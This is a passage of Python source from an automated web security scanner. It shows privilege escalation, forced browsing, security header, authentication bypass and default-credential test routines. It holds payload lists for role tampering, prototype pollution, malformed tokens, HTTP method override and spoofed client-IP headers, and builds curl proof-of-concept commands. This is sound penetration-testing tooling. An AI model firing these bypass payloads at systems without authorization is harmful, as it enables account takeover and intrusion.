            if resp and resp.status_code == 200 and resp.content_length > 50:
                evidence = (
                    f"Admin endpoint accessible with regular user credentials: "
                    f"{target.url} returned HTTP {resp.status_code} "
                    f"({resp.content_length} bytes)"
                )

                # Check if the response looks like actual admin content
                body_lower = resp.text.lower() if resp.text else ""
                admin_content_indicators = [
                    "users", "settings", "configuration",
                    "delete", "create", "modify",
                    "role", "permission", "admin",
                ]
                admin_content_found = [
                    ind for ind in admin_content_indicators if ind in body_lower
                ]

                if admin_content_found:
                    evidence += f" | Admin content indicators: {', '.join(admin_content_found)}"

                    result = TestResult(
                        target=target,
                        category=category,
                        payload="regular_user_token",
                        parameter="authorization",
                        request_url=target.url,
                        request_method=target.method,
                        response_status=resp.status_code,
                        response_body=resp.text[:2000] if resp.text else "",
                        response_time=resp.response_time,
                        response_size=resp.content_length,
                        baseline_status=baseline.status_code,
                        baseline_size=baseline.content_length,
                        is_vulnerable=True,
                        confidence=Confidence.HIGH,
                        severity=Severity.CRITICAL,
                        evidence=evidence,
                    )
                    result.poc = self._generate_poc(
                        target, category, "authorization",
                        "header", "Bearer <regular_user_token>", resp,
                    )
                    result.poc += "\n\n# Privilege Escalation: Admin endpoint accessible with regular user token"

                    if self.use_ai:
                        ai_vuln, ai_conf, ai_text = await self._ai_analyze_response(
                            category, target, "admin_access",
                            "regular_user_token", resp, baseline, evidence,
                        )
                        result.ai_analysis = ai_text

                    results.append(result)
                    self._record_finding(result)
                    found_vuln = True

        # === Strategy 2: Role manipulation in request body ===
        if target.method in ("POST", "PUT", "PATCH") and target.body:
            role_result = await self._test_role_manipulation(target, baseline)
            if role_result and role_result.is_vulnerable:
                results.append(role_result)
                self._record_finding(role_result)
                found_vuln = True

        # === Strategy 3: Add admin role to existing request ===
        if target.method in ("POST", "PUT", "PATCH"):
            inject_result = await self._test_role_injection(target, baseline)
            if inject_result and inject_result.is_vulnerable:
                results.append(inject_result)
                self._record_finding(inject_result)
                found_vuln = True

        self.state.mark_endpoint_tested(target.url, category.value, {
            "vulnerable": found_vuln,
        })

        return results

    async def _test_role_manipulation(
        self,
        target: ScanTarget,
        baseline: BaselineResponse,
    ) -> Optional[TestResult]:
        """
        If request body contains role/permission fields,
        try changing them to admin/elevated values.
        """
        if not target.body or not isinstance(target.body, dict):
            return None

        role_fields = [
            "role", "roles", "user_role", "userRole",
            "isAdmin", "is_admin", "admin", "privilege",
            "permissions", "permission", "access_level",
            "accessLevel", "level", "type", "userType",
            "user_type", "group", "groups",
        ]

        admin_values = [
            "admin", "administrator", "superuser", "root",
            True, 1, "1", "true",
        ]

        for field_name in role_fields:
            if self._cancelled:
                break

            # Try both existing fields and injecting new ones
            for admin_value in admin_values:
                if self._cancelled:
                    break

                modified_body = dict(target.body)
                modified_body[field_name] = admin_value

                resp = await self._send_raw_request(
                    method=target.method,
                    url=target.url,
                    params=target.params if target.params else None,
                    json_data=modified_body,
                )
                self._update_progress(ScanCategory.PRIVILEGE_ESCALATION, target.url)

                if not resp:
                    continue

                # Check if role was accepted
                is_vuln = False
                evidence = ""

                if resp.status_code in (200, 201):
                    body_lower = resp.text.lower() if resp.text else ""

                    # Check if response confirms role change
                    role_confirmations = [
                        "admin", "administrator", "role.*admin",
                        "success", "updated", "created",
                    ]
                    confirmed = any(
                        re.search(conf, body_lower) for conf in role_confirmations
                    )

                    if confirmed:
                        is_vuln = True
                        evidence = (
                            f"Role manipulation accepted: set {field_name}={admin_value}, "
                            f"server returned HTTP {resp.status_code}"
                        )

                    # Check JSON response for role confirmation
                    if resp.is_json and resp.json_data:
                        resp_data = resp.json_data
                        if isinstance(resp_data, dict):
                            resp_role = resp_data.get(field_name) or resp_data.get("role")
                            if resp_role and str(resp_role).lower() in ("admin", "administrator", "superuser"):
                                is_vuln = True
                                evidence = (
                                    f"Role escalation confirmed: {field_name}={admin_value} "
                                    f"accepted, response shows role={resp_role}"
                                )

                if is_vuln:
                    result = TestResult(
                        target=target,
                        category=ScanCategory.PRIVILEGE_ESCALATION,
                        payload=f"{field_name}={admin_value}",
                        parameter=field_name,
                        request_url=target.url,
                        request_method=target.method,
                        request_body=modified_body,
                        response_status=resp.status_code,
                        response_body=resp.text[:2000] if resp.text else "",
                        response_time=resp.response_time,
                        response_size=resp.content_length,
                        baseline_status=baseline.status_code,
                        baseline_size=baseline.content_length,
                        is_vulnerable=True,
                        confidence=Confidence.HIGH,
                        severity=Severity.CRITICAL,
                        evidence=evidence,
                    )
                    result.poc = (
                        f"curl -X {target.method} '{target.url}' "
                        f"-H 'Content-Type: application/json' "
                    )
                    if self._auth_token:
                        result.poc += f"-H 'Authorization: Bearer {self._auth_token}' "
                    result.poc += f"-d '{json.dumps(modified_body)}'"
                    result.poc += f"\n\n# Privilege Escalation: Added/modified {field_name}={admin_value}"

                    self._all_results.append(result)
                    return result

        return None

    async def _test_role_injection(
        self,
        target: ScanTarget,
        baseline: BaselineResponse,
    ) -> Optional[TestResult]:
        """
        Try injecting role/admin fields into request body
        even if they don't exist in the original request.
        """
        if not target.body or not isinstance(target.body, dict):
            return None

        injection_payloads = [
            {"role": "admin"},
            {"isAdmin": True},
            {"role": "admin", "isAdmin": True},
            {"__proto__": {"isAdmin": True}},
            {"constructor": {"prototype": {"isAdmin": True}}},
        ]

        for inject_data in injection_payloads:
            if self._cancelled:
                break

            modified_body = dict(target.body)
            modified_body.update(inject_data)

            resp = await self._send_raw_request(
                method=target.method,
                url=target.url,
                params=target.params if target.params else None,
                json_data=modified_body,
            )
            self._update_progress(ScanCategory.PRIVILEGE_ESCALATION, target.url)

            if not resp:
                continue

            if resp.status_code in (200, 201):
                body_lower = resp.text.lower() if resp.text else ""

                # Check for prototype pollution indicators
                proto_indicators = ["isadmin", "admin.*true", "role.*admin"]
                if any(re.search(ind, body_lower) for ind in proto_indicators):
                    inject_str = json.dumps(inject_data)
                    evidence = (
                        f"Role injection accepted: injected {inject_str} into request body, "
                        f"server returned HTTP {resp.status_code} with admin indicators in response"
                    )

                    result = TestResult(
                        target=target,
                        category=ScanCategory.PRIVILEGE_ESCALATION,
                        payload=inject_str,
                        parameter="injected_fields",
                        request_url=target.url,
                        request_method=target.method,
                        request_body=modified_body,
                        response_status=resp.status_code,
                        response_body=resp.text[:2000] if resp.text else "",
                        response_time=resp.response_time,
                        response_size=resp.content_length,
                        baseline_status=baseline.status_code,
                        baseline_size=baseline.content_length,
                        is_vulnerable=True,
                        confidence=Confidence.MEDIUM,
                        severity=Severity.CRITICAL,
                        evidence=evidence,
                    )
                    result.poc = (
                        f"curl -X {target.method} '{target.url}' "
                        f"-H 'Content-Type: application/json' "
                    )
                    if self._auth_token:
                        result.poc += f"-H 'Authorization: Bearer {self._auth_token}' "
                    result.poc += f"-d '{json.dumps(modified_body)}'"
                    result.poc += f"\n\n# Privilege Escalation via field injection: {inject_str}"

                    self._all_results.append(result)
                    return result

        return None

    # =================================================================
    # FORCED BROWSING SCANNER
    # =================================================================

    async def _scan_forced_browsing(self) -> List[TestResult]:
        """
        Test for forced browsing / information disclosure by
        accessing common admin/debug/sensitive endpoints that
        should not be accessible.
        """
        results: List[TestResult] = []
        category = ScanCategory.FORCED_BROWSING

        if self._is_tested(self.target_url, category):
            return results

        logger.info(
            "Forced Browsing: Testing %d paths against %s",
            len(FORCED_BROWSING_PATHS), self.target_url,
        )

        # Get already known endpoints to avoid duplicates
        known_endpoints = set()
        for ep in self.state.get_all_endpoints():
            parsed = urlparse(ep.get("url", ""))
            known_endpoints.add(parsed.path)

        # Capture baseline for a guaranteed 404
        baseline_404 = BaselineResponse(
            url=f"{self.target_url}/definitely_not_exists_xyz_12345",
            method="GET",
        )
        resp_404 = await self._send_raw_request(
            "GET",
            f"{self.target_url}/definitely_not_exists_xyz_12345",
        )
        if resp_404:
            baseline_404.status_code = resp_404.status_code
            baseline_404.content_length = resp_404.content_length
            baseline_404.body_hash = hashlib.md5(
                resp_404.text.encode("utf-8", errors="replace")
            ).hexdigest() if resp_404.text else ""
            baseline_404.captured = True

        # Test each path
        semaphore = asyncio.Semaphore(MAX_CONCURRENT_REQUESTS)

        async def test_path(path: str) -> Optional[TestResult]:
            if self._cancelled:
                return None

            test_url = urljoin(self.target_url + "/", path.lstrip("/"))

            # Skip already known endpoints
            parsed_test = urlparse(test_url)
            if parsed_test.path in known_endpoints:
                return None

            async with semaphore:
                resp = await self._send_raw_request("GET", test_url)
                self._update_progress(category, test_url)

            if not resp:
                return None

            # Skip if same as 404 baseline
            if baseline_404.captured:
                resp_hash = hashlib.md5(
                    resp.text.encode("utf-8", errors="replace")
                ).hexdigest() if resp.text else ""
                if (
                    resp.status_code == baseline_404.status_code
                    and resp_hash == baseline_404.body_hash
                ):
                    return None

            # Interesting responses
            is_interesting = False
            evidence_parts: List[str] = []
            severity = Severity.INFO

            if resp.status_code == 200:
                is_interesting = True
                evidence_parts.append(
                    f"Accessible: {path} returned HTTP 200 ({resp.content_length} bytes)"
                )

                # Check for sensitive content
                body_lower = resp.text.lower() if resp.text else ""

                if any(ind in body_lower for ind in [
                    "password", "secret", "api_key", "apikey",
                    "private_key", "access_token",
                ]):
                    evidence_parts.append("Contains sensitive data keywords")
                    severity = Severity.CRITICAL

                elif any(ind in body_lower for ind in [
                    "admin", "administrator", "management",
                    "configuration", "settings",
                ]):
                    evidence_parts.append("Contains admin/config keywords")
                    severity = Severity.HIGH

                elif any(ind in body_lower for ind in [
                    "swagger", "api-docs", "openapi",
                    "graphql", "graphiql",
                ]):
                    evidence_parts.append("API documentation exposed")
                    severity = Severity.MEDIUM

                elif any(ind in body_lower for ind in [
                    "stack trace", "traceback", "exception",
                    "debug", "error",
                ]):
                    evidence_parts.append("Debug/error information exposed")
                    severity = Severity.MEDIUM

                # Check for file content
                if any(ind in body_lower for ind in [
                    "root:", "[boot loader]",
                    "<?php", "<%", "#!/",
                ]):
                    evidence_parts.append("File content exposed")
                    severity = Severity.HIGH

                # JSON data that looks like user data
                if resp.is_json and resp.json_data:
                    data = resp.json_data
                    if isinstance(data, list) and len(data) > 0:
                        evidence_parts.append(f"JSON array with {len(data)} items returned")
                        severity = Severity.HIGH
                    elif isinstance(data, dict):
                        sensitive = resp.has_sensitive_data()
                        if sensitive:
                            evidence_parts.append(
                                f"Sensitive data types found: {', '.join(sensitive.keys())}"
                            )
                            severity = Severity.CRITICAL

            elif resp.status_code in (301, 302, 307, 308):
                redirect_url = resp.redirect_url
                if redirect_url and "login" not in (redirect_url or "").lower():
                    is_interesting = True
                    evidence_parts.append(
                        f"Redirect to: {redirect_url} (may indicate protected resource)"
                    )
                    severity = Severity.LOW

            elif resp.status_code == 403:
                # Exists but forbidden — interesting for further testing
                is_interesting = True
                evidence_parts.append(
                    f"Resource exists but forbidden: {path} returned HTTP 403"
                )
                severity = Severity.INFO

            if is_interesting and evidence_parts:
                result = TestResult(
                    target=ScanTarget(url=test_url, method="GET"),
                    category=category,
                    payload=path,
                    parameter="path",
                    request_url=test_url,
                    request_method="GET",
                    response_status=resp.status_code,
                    response_body=resp.text[:2000] if resp.text else "",
                    response_time=resp.response_time,
                    response_size=resp.content_length,
                    is_vulnerable=resp.status_code == 200 and severity.value in (
                        "critical", "high", "medium",
                    ),
                    confidence=Confidence.HIGH if resp.status_code == 200 else Confidence.LOW,
                    severity=severity,
                    evidence=" | ".join(evidence_parts),
                )
                result.poc = f"curl -v '{test_url}'"
                if self._auth_token:
                    result.poc += f" -H 'Authorization: Bearer {self._auth_token}'"
                result.poc += f"\n\n# Forced Browsing: {path}"

                # Add discovered endpoint to state
                self.state.add_endpoint({
                    "url": test_url,
                    "method": "GET",
                    "source": "forced_browsing",
                    "status_code": resp.status_code,
                })

                self._all_results.append(result)
                return result

            return None

        # Run all path tests concurrently
        tasks = [test_path(path) for path in FORCED_BROWSING_PATHS]
        all_results = await asyncio.gather(*tasks, return_exceptions=True)

        for r in all_results:
            if isinstance(r, TestResult):
                results.append(r)
                if r.is_vulnerable:
                    self._record_finding(r)

        # Also test with browser for SPA hash routes
        spa_routes = [
            "/#/administration",
            "/#/admin",
            "/#/accounting",
            "/#/privacy-security/last-login-ip",
            "/#/score-board",
            "/#/order-history",
            "/#/recycle",
            "/#/complain",
            "/#/chatbot",
            "/#/deluxe-membership",
        ]

        for route in spa_routes:
            if self._cancelled:
                break

            try:
                test_url = self.target_url + route
                page_data = await self.browser.navigate(test_url, wait_for="networkidle")

                if page_data and page_data.html:
                    html_lower = page_data.html.lower()
                    # Check if actual content loaded (not redirected to login)
                    if (
                        "login" not in html_lower[:500]
                        and "unauthorized" not in html_lower[:500]
                        and len(page_data.html) > 500
                    ):
                        evidence = f"SPA route accessible: {route}"
                        is_admin = any(
                            ind in html_lower
                            for ind in ["admin", "administration", "score-board", "user table"]
                        )

                        if is_admin:
                            evidence += " — admin/sensitive content detected"

                        result = TestResult(
                            target=ScanTarget(url=test_url, method="GET"),
                            category=category,
                            payload=route,
                            parameter="spa_route",
                            request_url=test_url,
                            request_method="GET",
                            response_status=200,
                            response_body=page_data.html[:2000],
                            is_vulnerable=is_admin,
                            confidence=Confidence.HIGH if is_admin else Confidence.MEDIUM,
                            severity=Severity.HIGH if is_admin else Severity.MEDIUM,
                            evidence=evidence,
                        )
                        result.poc = f"# Open in browser:\n{test_url}"

                        results.append(result)
                        self._all_results.append(result)
                        if result.is_vulnerable:
                            self._record_finding(result)

            except Exception as exc:
                logger.debug("SPA route test error for %s: %s", route, str(exc))

            self._update_progress(category, self.target_url)

        self._mark_category_complete(category)
        self.state.mark_endpoint_tested(self.target_url, category.value, {
            "paths_tested": len(FORCED_BROWSING_PATHS) + len(spa_routes),
            "findings": len(results),
        })

        return results

    # =================================================================
    # SECURITY HEADERS SCANNER
    # =================================================================

    async def _scan_security_headers(self) -> List[TestResult]:
        """
        Check for missing or misconfigured security headers
        on the main target and key endpoints.
        """
        results: List[TestResult] = []
        category = ScanCategory.SECURITY_HEADERS

        if self._is_tested(self.target_url, category):
            return results

        urls_to_check = [self.target_url]
        # Add a few key endpoints
        for ep in self.state.get_all_endpoints()[:5]:
            url = ep.get("url", "")
            if url and url not in urls_to_check:
                urls_to_check.append(url)

        for check_url in urls_to_check:
            if self._cancelled:
                break

            resp = await self._send_raw_request("GET", check_url)
            self._update_progress(category, check_url)

            if not resp:
                continue

            # Use SmartResponse's built-in security header analysis
            header_analysis = resp.analyse_security_headers()

            missing_headers: List[str] = []
            misconfigured_headers: List[str] = []

            # Check critical security headers
            critical_headers = {
                "X-Frame-Options": {
                    "expected": ["DENY", "SAMEORIGIN"],
                    "severity": Severity.MEDIUM,
                    "desc": "Clickjacking protection",
                },
                "X-Content-Type-Options": {
                    "expected": ["nosniff"],
                    "severity": Severity.LOW,
                    "desc": "MIME-type sniffing protection",
                },
                "X-XSS-Protection": {
                    "expected": ["1; mode=block", "1"],
                    "severity": Severity.LOW,
                    "desc": "XSS filter",
                },
                "Strict-Transport-Security": {
                    "expected": None,  # Just needs to be present
                    "severity": Severity.MEDIUM,
                    "desc": "HSTS — force HTTPS",
                },
                "Content-Security-Policy": {
                    "expected": None,
                    "severity": Severity.MEDIUM,
                    "desc": "CSP — content source restrictions",
                },
                "Referrer-Policy": {
                    "expected": None,
                    "severity": Severity.LOW,
                    "desc": "Referrer information control",
                },
                "Permissions-Policy": {
                    "expected": None,
                    "severity": Severity.LOW,
                    "desc": "Browser feature restrictions",
                },
            }

            headers_dict = {
                k.lower(): v for k, v in (resp.headers or {}).items()
            }

            for header_name, config in critical_headers.items():
                header_lower = header_name.lower()
                if header_lower not in headers_dict:
                    missing_headers.append(
                        f"{header_name} ({config['desc']})"
                    )
                elif config["expected"]:
                    value = headers_dict[header_lower]
                    if not any(
                        exp.lower() in value.lower()
                        for exp in config["expected"]
                    ):
                        misconfigured_headers.append(
                            f"{header_name}: {value} "
                            f"(expected: {' or '.join(config['expected'])})"
                        )

            # Check for information disclosure headers
            info_headers = [
                "server", "x-powered-by", "x-aspnet-version",
                "x-aspnetmvc-version",
            ]
            disclosed = []
            for h in info_headers:
                if h in headers_dict:
                    disclosed.append(f"{h}: {headers_dict[h]}")

            # Build findings
            if missing_headers:
                evidence = f"Missing security headers: {'; '.join(missing_headers)}"
                result = TestResult(
                    target=ScanTarget(url=check_url, method="GET"),
                    category=category,
                    payload="header_check",
                    parameter="security_headers",
                    request_url=check_url,
                    request_method="GET",
                    response_status=resp.status_code,
                    is_vulnerable=True,
                    confidence=Confidence.CONFIRMED,
                    severity=Severity.MEDIUM if len(missing_headers) > 3 else Severity.LOW,
                    evidence=evidence,
                )
                result.poc = f"curl -I '{check_url}'"
                result.poc += f"\n\n# Missing headers:\n"
                for mh in missing_headers:
                    result.poc += f"# - {mh}\n"

                results.append(result)
                self._record_finding(result)
                self._all_results.append(result)

            if disclosed:
                evidence = f"Information disclosure via headers: {'; '.join(disclosed)}"
                result = TestResult(
                    target=ScanTarget(url=check_url, method="GET"),
                    category=category,
                    payload="info_disclosure",
                    parameter="server_headers",
                    request_url=check_url,
                    request_method="GET",
                    response_status=resp.status_code,
                    is_vulnerable=True,
                    confidence=Confidence.CONFIRMED,
                    severity=Severity.LOW,
                    evidence=evidence,
                )
                result.poc = f"curl -I '{check_url}'"
                result.poc += f"\n\n# Disclosed headers:\n"
                for d in disclosed:
                    result.poc += f"# - {d}\n"

                results.append(result)
                self._record_finding(result)
                self._all_results.append(result)

        self._mark_category_complete(category)
        self.state.mark_endpoint_tested(self.target_url, category.value, {
            "urls_checked": len(urls_to_check),
            "findings": len(results),
        })

        return results
        # =================================================================
    # AUTHENTICATION BYPASS SCANNER
    # =================================================================

    async def _scan_auth_bypass(self, target: ScanTarget) -> List[TestResult]:
        """
        Test for authentication bypass vulnerabilities:
        1. Access authenticated endpoints without token.
        2. Use expired / malformed tokens.
        3. HTTP method tampering.
        4. Header manipulation.
        """
        results: List[TestResult] = []
        category = ScanCategory.AUTH_BYPASS
        baseline = self._get_baseline(target)

        if self._is_tested(target.url, category):
            return results

        found_vuln = False

        # === Strategy 1: Remove authentication entirely ===
        no_auth_result = await self._test_no_auth_access(target, baseline)
        if no_auth_result and no_auth_result.is_vulnerable:
            results.append(no_auth_result)
            self._record_finding(no_auth_result)
            found_vuln = True

        # === Strategy 2: Malformed / invalid tokens ===
        if not found_vuln:
            bad_token_result = await self._test_bad_token_access(target, baseline)
            if bad_token_result and bad_token_result.is_vulnerable:
                results.append(bad_token_result)
                self._record_finding(bad_token_result)
                found_vuln = True

        # === Strategy 3: HTTP method tampering ===
        if not found_vuln:
            method_result = await self._test_method_tampering(target, baseline)
            if method_result and method_result.is_vulnerable:
                results.append(method_result)
                self._record_finding(method_result)
                found_vuln = True

        # === Strategy 4: Header bypass techniques ===
        if not found_vuln:
            header_result = await self._test_header_bypass(target, baseline)
            if header_result and header_result.is_vulnerable:
                results.append(header_result)
                self._record_finding(header_result)
                found_vuln = True

        self.state.mark_endpoint_tested(target.url, category.value, {
            "vulnerable": found_vuln,
        })

        return results

    async def _test_no_auth_access(
        self,
        target: ScanTarget,
        baseline: BaselineResponse,
    ) -> Optional[TestResult]:
        """
        Try accessing an authenticated endpoint without
        any authentication token or cookies.
        """
        if not target.requires_auth and not self._auth_token:
            return None

        # Save current auth state
        saved_token = self._auth_token
        saved_cookies = dict(self._auth_cookies)

        try:
            # Clear auth from HTTP client
            self.http.clear_auth_token()
            self.http.set_cookies({})

            resp = await self._send_raw_request(
                method=target.method,
                url=target.url,
                params=target.params if target.params else None,
                json_data=target.body,
                headers={"Authorization": ""},
            )
            self._update_progress(ScanCategory.AUTH_BYPASS, target.url)

            if not resp:
                return None

            # Check if we still got access
            if resp.status_code == 200 and resp.content_length > 50:
                body_lower = resp.text.lower() if resp.text else ""
                # Make sure it's not a login page or error
                not_login = all(
                    kw not in body_lower
                    for kw in ["login", "sign in", "authenticate", "unauthorized"]
                )

                if not_login:
                    evidence = (
                        f"Endpoint accessible WITHOUT authentication: "
                        f"{target.method} {target.url} returned HTTP {resp.status_code} "
                        f"({resp.content_length} bytes) without any auth token"
                    )

                    result = TestResult(
                        target=target,
                        category=ScanCategory.AUTH_BYPASS,
                        payload="no_auth_token",
                        parameter="authorization",
                        request_url=target.url,
                        request_method=target.method,
                        response_status=resp.status_code,
                        response_body=resp.text[:2000] if resp.text else "",
                        response_time=resp.response_time,
                        response_size=resp.content_length,
                        baseline_status=baseline.status_code,
                        baseline_size=baseline.content_length,
                        is_vulnerable=True,
                        confidence=Confidence.CONFIRMED,
                        severity=Severity.CRITICAL,
                        evidence=evidence,
                    )
                    result.poc = (
                        f"curl -X {target.method} '{target.url}'"
                    )
                    if target.body:
                        result.poc += f" -H 'Content-Type: application/json' -d '{json.dumps(target.body)}'"
                    result.poc += "\n\n# No authentication header sent — endpoint still accessible"

                    self._all_results.append(result)
                    return result

            return None

        finally:
            # Restore auth state
            if saved_token:
                self._auth_token = saved_token
                self.http.set_auth_token(saved_token, "Bearer")
            if saved_cookies:
                self._auth_cookies = saved_cookies
                self.http.set_cookies(saved_cookies)

    async def _test_bad_token_access(
        self,
        target: ScanTarget,
        baseline: BaselineResponse,
    ) -> Optional[TestResult]:
        """
        Try accessing with invalid / malformed / expired tokens.
        """
        bad_tokens = [
            ("empty_bearer", "Bearer "),
            ("null_token", "Bearer null"),
            ("undefined_token", "Bearer undefined"),
            ("invalid_jwt", "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"),
            ("basic_auth", "Basic YWRtaW46YWRtaW4="),
            ("no_scheme", self._auth_token[:20] + "TAMPERED" if self._auth_token else "invalidtoken123"),
            ("altered_token", (self._auth_token[:-5] + "XXXXX") if self._auth_token else "invalidtoken123"),
        ]

        for token_name, token_value in bad_tokens:
            if self._cancelled:
                break

            resp = await self._send_raw_request(
                method=target.method,
                url=target.url,
                params=target.params if target.params else None,
                json_data=target.body,
                headers={"Authorization": token_value},
            )
            self._update_progress(ScanCategory.AUTH_BYPASS, target.url)

            if not resp:
                continue

            if resp.status_code == 200 and resp.content_length > 50:
                body_lower = resp.text.lower() if resp.text else ""
                not_error = all(
                    kw not in body_lower
                    for kw in ["login", "unauthorized", "invalid token", "expired"]
                )

                if not_error:
                    evidence = (
                        f"Auth bypass with {token_name}: {target.method} {target.url} "
                        f"returned HTTP {resp.status_code} with malformed token"
                    )

                    result = TestResult(
                        target=target,
                        category=ScanCategory.AUTH_BYPASS,
                        payload=f"{token_name}: {token_value[:50]}...",
                        parameter="authorization",
                        request_url=target.url,
                        request_method=target.method,
                        response_status=resp.status_code,
                        response_body=resp.text[:2000] if resp.text else "",
                        response_time=resp.response_time,
                        response_size=resp.content_length,
                        baseline_status=baseline.status_code,
                        baseline_size=baseline.content_length,
                        is_vulnerable=True,
                        confidence=Confidence.HIGH,
                        severity=Severity.CRITICAL,
                        evidence=evidence,
                    )
                    result.poc = (
                        f"curl -X {target.method} '{target.url}' "
                        f"-H 'Authorization: {token_value}'"
                    )
                    result.poc += f"\n\n# Auth bypass using {token_name}"

                    self._all_results.append(result)
                    return result

        return None

    async def _test_method_tampering(
        self,
        target: ScanTarget,
        baseline: BaselineResponse,
    ) -> Optional[TestResult]:
        """
        Try different HTTP methods to bypass auth.
        Some servers only enforce auth on specific methods.
        """
        methods_to_try = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"]
        # Remove the original method
        methods_to_try = [m for m in methods_to_try if m != target.method]

        # Also try method override headers
        override_headers = [
            {"X-HTTP-Method-Override": "GET"},
            {"X-HTTP-Method": "GET"},
            {"X-Method-Override": "GET"},
            {"_method": "GET"},
        ]

        # Save and clear auth
        saved_token = self._auth_token
        saved_cookies = dict(self._auth_cookies)

        try:
            self.http.clear_auth_token()
            self.http.set_cookies({})

            for method in methods_to_try:
                if self._cancelled:
                    break

                resp = await self._send_raw_request(
                    method=method,
                    url=target.url,
                    params=target.params if target.params else None,
                    json_data=target.body if method in ("POST", "PUT", "PATCH") else None,
                )
                self._update_progress(ScanCategory.AUTH_BYPASS, target.url)

                if not resp:
                    continue

                if resp.status_code == 200 and resp.content_length > 50:
                    body_lower = resp.text.lower() if resp.text else ""
                    not_error = "unauthorized" not in body_lower and "login" not in body_lower

                    if not_error:
                        evidence = (
                            f"HTTP method tampering bypass: "
                            f"original method {target.method} requires auth, "
                            f"but {method} returns HTTP {resp.status_code} without auth"
                        )

                        result = TestResult(
                            target=target,
                            category=ScanCategory.AUTH_BYPASS,
                            payload=f"method_override:{method}",
                            parameter="http_method",
                            request_url=target.url,
                            request_method=method,
                            response_status=resp.status_code,
                            response_body=resp.text[:2000] if resp.text else "",
                            response_time=resp.response_time,
                            response_size=resp.content_length,
                            baseline_status=baseline.status_code,
                            baseline_size=baseline.content_length,
                            is_vulnerable=True,
                            confidence=Confidence.HIGH,
                            severity=Severity.HIGH,
                            evidence=evidence,
                        )
                        result.poc = f"curl -X {method} '{target.url}'"
                        result.poc += f"\n\n# Method tampering: {target.method} → {method} bypasses auth"

                        self._all_results.append(result)
                        return result

            # Try method override headers with POST
            for override in override_headers:
                if self._cancelled:
                    break

                resp = await self._send_raw_request(
                    method="POST",
                    url=target.url,
                    headers=override,
                )
                self._update_progress(ScanCategory.AUTH_BYPASS, target.url)

                if resp and resp.status_code == 200 and resp.content_length > 50:
                    override_key = list(override.keys())[0]
                    override_val = list(override.values())[0]
                    evidence = (
                        f"Method override bypass: POST with {override_key}: {override_val} "
                        f"returned HTTP {resp.status_code} without auth"
                    )

                    result = TestResult(
                        target=target,
                        category=ScanCategory.AUTH_BYPASS,
                        payload=f"{override_key}:{override_val}",
                        parameter="method_override_header",
                        request_url=target.url,
                        request_method="POST",
                        response_status=resp.status_code,
                        response_body=resp.text[:2000] if resp.text else "",
                        response_time=resp.response_time,
                        response_size=resp.content_length,
                        baseline_status=baseline.status_code,
                        baseline_size=baseline.content_length,
                        is_vulnerable=True,
                        confidence=Confidence.HIGH,
                        severity=Severity.HIGH,
                        evidence=evidence,
                    )
                    result.poc = (
                        f"curl -X POST '{target.url}' "
                        f"-H '{override_key}: {override_val}'"
                    )
                    result.poc += f"\n\n# Method override bypass using {override_key} header"

                    self._all_results.append(result)
                    return result

            return None

        finally:
            if saved_token:
                self._auth_token = saved_token
                self.http.set_auth_token(saved_token, "Bearer")
            if saved_cookies:
                self._auth_cookies = saved_cookies
                self.http.set_cookies(saved_cookies)

    async def _test_header_bypass(
        self,
        target: ScanTarget,
        baseline: BaselineResponse,
    ) -> Optional[TestResult]:
        """
        Try header-based auth bypass techniques:
        X-Forwarded-For, X-Original-URL, etc.
        """
        bypass_headers_list = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Forwarded-Host": "127.0.0.1"},
            {"X-Original-URL": target.url},
            {"X-Rewrite-URL": target.url},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
            {"X-Host": "127.0.0.1"},
            {"X-Forwarded-Port": "443"},
            {"X-Forwarded-Scheme": "https"},
            {"X-ProxyUser-IP": "127.0.0.1"},
            {"True-Client-IP": "127.0.0.1"},
            {"Client-IP": "127.0.0.1"},
            {"Cluster-Client-IP": "127.0.0.1"},
        ]

        saved_token = self._auth_token
        saved_cookies = dict(self._auth_cookies)

        try:
            self.http.clear_auth_token()
            self.http.set_cookies({})

            for bypass_headers in bypass_headers_list:
                if self._cancelled:
                    break

                resp = await self._send_raw_request(
                    method=target.method,
                    url=target.url,
                    params=target.params if target.params else None,
                    json_data=target.body,
                    headers=bypass_headers,
                )
                self._update_progress(ScanCategory.AUTH_BYPASS, target.url)

                if not resp:
                    continue

                if resp.status_code == 200 and resp.content_length > 50:
                    body_lower = resp.text.lower() if resp.text else ""
                    not_error = all(
                        kw not in body_lower
                        for kw in ["unauthorized", "login", "forbidden", "invalid"]
                    )

                    if not_error:
                        header_name = list(bypass_headers.keys())[0]
                        header_value = list(bypass_headers.values())[0]
                        evidence = (
                            f"Header-based auth bypass: {header_name}: {header_value} "
                            f"returned HTTP {resp.status_code} ({resp.content_length} bytes) "
                            f"without proper authentication"
                        )

                        result = TestResult(
                            target=target,
                            category=ScanCategory.AUTH_BYPASS,
                            payload=f"{header_name}:{header_value}",
                            parameter=header_name,
                            request_url=target.url,
                            request_method=target.method,
                            response_status=resp.status_code,
                            response_body=resp.text[:2000] if resp.text else "",
                            response_time=resp.response_time,
                            response_size=resp.content_length,
                            baseline_status=baseline.status_code,
                            baseline_size=baseline.content_length,
                            is_vulnerable=True,
                            confidence=Confidence.HIGH,
                            severity=Severity.CRITICAL,
                            evidence=evidence,
                        )
                        result.poc = (
                            f"curl -X {target.method} '{target.url}' "
                            f"-H '{header_name}: {header_value}'"
                        )
                        result.poc += f"\n\n# Auth bypass via {header_name} header"

                        self._all_results.append(result)
                        return result

            return None

        finally:
            if saved_token:
                self._auth_token = saved_token
                self.http.set_auth_token(saved_token, "Bearer")
            if saved_cookies:
                self._auth_cookies = saved_cookies
                self.http.set_cookies(saved_cookies)

    # =================================================================
    # DEFAULT CREDENTIALS SCANNER
    # =================================================================

    async def _scan_default_creds(self) -> List[TestResult]:
        """
        Test default/common credentials against login endpoint.
        """
        results: List[TestResult] = []
        category = ScanCategory.DEFAULT_CREDS

        login_url = self.state.get_login_endpoint()
        if not login_url:
            logger.debug("Default creds: No login endpoint found, skipping")
            return results

        if self._is_tested(login_url, category):
            return results

        logger.info(
            "Default Creds: Testing %d credential pairs against %s",
